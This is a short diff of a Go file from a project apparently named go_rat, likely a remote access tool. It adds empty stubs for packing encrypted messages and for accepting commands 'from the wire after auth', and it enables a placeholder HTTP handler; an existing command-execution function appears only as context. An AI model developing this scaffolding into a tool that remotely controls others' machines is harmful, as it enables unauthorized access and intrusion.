@@ -5,17 +5,22 @@ https://gist.github.com/denji/12b3a568f092ab951456
 package Core
 
 import (
+	"crypto"
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"log"
 	"net/http"
 	"os"
 )
 
-// trying out something I just learned
-// attaching functions to types via pointers?
 //  item to modify----- name of new func--- return types
-func (MessageWrapper *AESPacket) Lex() (message *AESPacket, derp error) {
+func (MessageWrapper *AESPacket) PackMessage(dataBytes []byte, key crypto.PublicKey) (message *AESPacket, derp error) {
 
+}
+
+/*/ 
+This function adds a command from the wire after auth
+/*/
+func (command *Command) AddCommand(CommandString string){
 }
 
 //function to execute command
@@ -40,7 +45,6 @@ func exec_command(command_struct *Command) *RatProcess {
 	return &new_process
 }
 
-/*/
 func hTTPServerCore(w http.ResponseWriter, req *http.Request) {
 	w.Header().Set("Content-Type", "text/plain")
 	w.Write([]byte("Hola migo, donde esta me gato loco?.\n"))
